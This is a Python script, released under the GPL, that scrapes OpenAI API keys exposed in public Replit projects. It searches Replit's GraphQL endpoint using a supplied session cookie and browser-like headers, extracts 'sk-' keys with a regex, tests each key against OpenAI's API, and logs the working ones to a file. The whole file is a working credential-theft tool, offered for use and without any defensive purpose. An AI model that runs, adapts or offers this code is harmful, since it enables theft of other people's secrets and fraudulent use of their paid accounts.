import requests
import sys
import re
import time
import os

copyright_notice = """
ading2210/openai-key-scraper: a Python script to scrape OpenAI API keys that are exposed on public Replit projects
Copyright (C) 2023 ading2210

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
""".strip()

graphql_url = "https://replit.com/graphql"
graphql_headers = {
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
  "Accept": "*/*",
  "Accept-Language": "en-US,en;q=0.5",
  "Content-Type": "application/json",
  "x-requested-with": "XMLHttpRequest",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  "Pragma": "no-cache",
  "Cache-Control": "no-cache",
  "Referrer": "https://replit.com/search",
}

with open("graphql/SearchPageSearchResults.graphql") as f:
  graphql_query = f.read()

known_keys = []
if os.path.exists("found_keys.txt"):
  with open("found_keys.txt") as f:
    known_keys = f.read().strip().split("\n")

def perform_search(query, page, sort):
  payload = [{
    "operationName": "SearchPageSearchResults",
    "variables": {
      "options": {
        "onlyCalculateHits": False,
        "categories": ["Files"],
        "query": query,
        "categorySettings": {
          "docs": {},
          "files": {
            "page": {
              "first": 10,
              "after": str(page)
            },
            "sort": sort,
            "exactMatch": False,
            "myCode": False
          }
        }
      }
    },
    "query": graphql_query
  }]

  r = requests.post(graphql_url, headers=graphql_headers, json=payload)
  data = r.json()
  #print(data)
  search = data[0]["data"]["search"]
  if not "fileResults" in search:
    if "message" in search:
      print("Replit returned an error. Retrying in 5 seconds...")
      print(search["message"])
      time.sleep(5)
      return perform_search(query, page, sort)
    return []
  file_results = data[0]["data"]["search"]["fileResults"]["results"]["items"]
  
  found_keys = []
  key_regex = "sk-[a-zA-Z0-9]{48}"
  for result in file_results:
    file_contents = result["fileContents"]
    matches = re.findall(key_regex, file_contents)
    found_keys += matches
  return list(set(found_keys))

def validate_key(key):
  validation_url = "https://api.openai.com/v1/models"
  headers = {
    "Authorization": f"Bearer {key}"
  }
  r = requests.get(validation_url, headers=headers)
  return r.ok

def log_key(key):
  with open("found_keys.txt", "a") as f:
    f.write(key + "\n")

def search_all_pages(query):
  found_keys = []
  valid_keys = []
  for page in range(1, 21):
    print(f"Checking page {page}...")
    keys = perform_search(query, page, "RecentlyModified")
    print(f"Found {len(keys)} matches (not validated)")

    for key in keys:
      if key in found_keys:
        continue
      if key in known_keys:
        print(f"Found working key (cached): {key}")
      elif validate_key(key):
        valid_keys.append(key)
        log_key(key)
        print(f"Found working key: {key}")
    
    found_keys += keys

  return valid_keys

if __name__ == "__main__":
  print(copyright_notice)
  input("\n======\n\nHit enter to continue and to confirm that you have read the copyright notice for this program. ")
  print("\n======\n")

  if len(sys.argv) < 2:
    raise IndexError("Cookie not provided. Pass in your cookie as the next argument. Like 'python3 main.py \"cookie_here\"'")
  cookie = sys.argv[1]
  graphql_headers["Cookie"] = cookie

  if len(sys.argv) > 2:
    query = sys.argv[2]
  else:
    query = "sk- openai"

  print(f"Searching with query: {query}")
  all_keys = search_all_pages(query)
  print("Search complete. Check found_keys.txt for results.")